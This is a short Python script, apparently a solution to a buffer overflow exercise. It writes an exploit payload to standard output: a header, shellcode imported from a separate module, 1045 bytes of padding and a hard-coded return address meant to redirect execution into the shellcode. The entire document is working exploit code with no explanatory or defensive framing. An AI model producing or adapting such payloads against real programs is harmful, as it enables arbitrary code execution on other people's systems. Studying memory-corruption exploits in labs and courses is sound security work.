from struct import pack 
from shellcode import shellcode
import sys
padding = 1045
inj = bytes.fromhex('12'*padding)+pack("<I", 0xfffea300)
sys.stdout.buffer.write(bytes.fromhex('00010080')+shellcode+inj)
